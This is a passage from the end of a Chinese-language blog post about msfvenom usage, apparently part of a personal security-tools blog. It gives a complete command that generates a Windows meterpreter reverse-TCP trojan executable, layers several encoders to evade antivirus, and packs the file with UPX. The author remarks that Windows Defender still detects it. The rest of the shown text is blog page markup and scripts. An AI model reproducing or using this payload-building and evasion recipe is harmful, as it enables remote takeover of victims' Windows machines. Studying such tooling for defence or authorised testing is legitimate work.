+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">msfvenom -p windows/meterpreter/reverse_tcp <span class="hljs-attribute">lhost</span>=&lt;Your<span class="hljs-built_in"> IP </span>Address&gt; <span class="hljs-attribute">lport</span>=&lt;Your<span class="hljs-built_in"> Port </span><span class="hljs-keyword">to</span> Connect On&gt; -e x86/shikata_ga_nai -i 20 -f<span class="hljs-built_in"> raw </span>| msfvenom -e x86/alpha_upper -a x86 --platform windows -i 5 -f<span class="hljs-built_in"> raw </span>| msfvenom -e x86/shikata_ga_nai -a x86 --platform windows -i 10 -f<span class="hljs-built_in"> raw </span>| msfvenom -e x86/countdown -a x86 --platform windows -i 10  -f exe -o shell.exe<br></code></pre></td></tr></table></figure>
+
+<p>这里进行了这样的编码：</p>
+<ul>
+<li><code>shikata_ga_nai</code>编码20次</li>
+<li><code>alpha_upper</code>编码5次</li>
+<li><code>shikata_ga_nai</code>编码10次</li>
+<li><code>countdown</code>编码10次</li>
+</ul>
+<p>然后进行UPX加壳，</p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">upx <span class="hljs-keyword">shell</span>.<span class="hljs-keyword">exe</span><br></code></pre></td></tr></table></figure>
+
+<p>经过测试在<code>defender</code>的可以检测到的。</p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/bmjoker/p/10051014.html">9.利用msfvenom生成木马 - bmjoker - 博客园 (cnblogs.com)</a></li>
+<li></li>
+</ul>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E5%B7%A5%E5%85%B7/" class="category-chain-item">工具</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E5%B7%A5%E5%85%B7/">#工具</a>
+      
+        <a href="/tags/msf/">#msf</a>
+      
+        <a href="/tags/%E6%9C%A8%E9%A9%AC/">#木马</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>[工具] msfvenom用法</div>
+      <div>https://s1n9l3.github.io/2022/11/22/[工具] msfvenom用法/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>YY</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2022年11月22日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2022/11/22/%5B%E5%B7%A5%E5%85%B7%5D%20msf%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/" title="[工具] msf使用教程">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">[工具] msf使用教程</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/11/22/%5Bctf-web%5D%20ACTF2020%E6%96%B0%E7%94%9F%E8%B5%9B-Include/" title="[ctf-web] ACTF2020新生赛-Include">
+                        <span class="hidden-mobile">[ctf-web] ACTF2020新生赛-Include</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
